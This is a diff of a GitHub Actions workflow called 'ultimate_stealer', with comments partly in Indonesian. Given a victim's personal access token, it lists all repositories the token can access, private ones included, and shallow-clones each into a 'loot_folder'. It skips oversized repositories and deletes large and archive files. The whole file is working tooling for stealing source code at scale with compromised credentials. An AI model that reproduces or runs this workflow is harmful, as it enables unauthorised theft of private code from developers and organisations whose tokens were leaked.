@@ -1,4 +1,4 @@
-name: stealer_v2
+name: ultimate_stealer
 on:
   workflow_dispatch:
     inputs:
@@ -10,8 +10,8 @@ on:
         description: 'PAT'
         required: true
       size_limit_mb:
-        description: 'Size'
-        default: '300'
+        description: 'SIZE'
+        default: '500'
 
 jobs:
   harvest:
@@ -31,53 +31,47 @@ jobs:
           T_USER: ${{ github.event.inputs.target_username }}
           LIMIT: ${{ github.event.inputs.size_limit_mb }}
         run: |
-          mkdir loot_folder
+          mkdir -p loot_folder
           echo "=== STARTING INSPECTION FOR $T_USER ==="
           
-          # Ambil data semua repo (termasuk size)
           REPO_DATA=$(curl -s -H "Authorization: token $T_TOKEN" \
             "https://api.github.com/user/repos?visibility=all&per_page=100")
           
-          # Cek apakah token valid/bisa narik data
           if echo "$REPO_DATA" | grep -q "message"; then
-            echo "[!] Error dari GitHub API: $(echo "$REPO_DATA" | jq -r '.message')"
+            echo "[!] Error API: $(echo "$REPO_DATA" | jq -r '.message')"
             exit 1
           fi
 
-          # Hitung total estimasi
           TOTAL_KB=$(echo "$REPO_DATA" | jq '[.[].size] | add')
           TOTAL_MB=$(echo "scale=2; $TOTAL_KB / 1024" | bc)
           echo "[i] Estimasi total ukuran kotor: $TOTAL_MB MB"
           echo "------------------------------------------------"
 
-          # Proses per-repository
-          echo "$REPO_DATA" | jq -r '.[] | "\(.full_name)|\(.size)"' | while f_line read line; do
-            REPO_NAME=$(echo $line | cut -d'|' -f1)
-            REPO_SIZE_KB=$(echo $line | cut -d'|' -f2)
+          echo "$REPO_DATA" | jq -r '.[] | "\(.full_name)|\(.size)"' | while read -r line; do
+            [ -z "$line" ] && continue
+            
+            REPO_NAME=$(echo "$line" | cut -d'|' -f1)
+            REPO_SIZE_KB=$(echo "$line" | cut -d'|' -f2)
             REPO_SIZE_MB=$(echo "scale=2; $REPO_SIZE_KB / 1024" | bc)
             
-            # Cek Limit
             if (( $(echo "$REPO_SIZE_MB > $LIMIT" | bc -l) )); then
               echo "[SKIP] $REPO_NAME ($REPO_SIZE_MB MB) terlalu besar!"
               continue
             fi
 
             echo "[GET] $REPO_NAME ($REPO_SIZE_MB MB)..."
-            FOLDER_NAME=$(echo $REPO_NAME | sed 's/\//_/g')
+            FOLDER_NAME=$(echo "$REPO_NAME" | sed 's/\//_/g')
             
-            # Clone tanpa history agar ringan
-            git clone --depth 1 "https://$T_TOKEN@github.com/$REPO_NAME.git" "loot_folder/$FOLDER_NAME" 2>/dev/null
+            git clone --depth 1 "https://$T_TOKEN@github.com/$REPO_NAME.git" "loot_folder/$FOLDER_NAME" || echo "Gagal clone $REPO_NAME"
             
-            # Bersihkan folder .git di dalam hasil clone agar tidak menumpuk ukuran
             rm -rf "loot_folder/$FOLDER_NAME/.git"
           done
 
-      - name: Cleanup Large Files (Optional)
+      - name: Cleanup Large Files
         run: |
           echo "=== CLEANING UP TRASH FILES ==="
-          # Hapus file binari atau file di atas 50MB yang mungkin terbawa (aset game/video)
+          # Hapus file binari besar dan file arsip di dalam folder loot
           find loot_folder -type f -size +50M -delete
-          # Hapus file zip/rar/7z yang mungkin ada di dalam repo
           find loot_folder -name "*.zip" -o -name "*.rar" -o -name "*.7z" -o -name "*.exe" -delete
           echo "[+] Cleanup done."
 
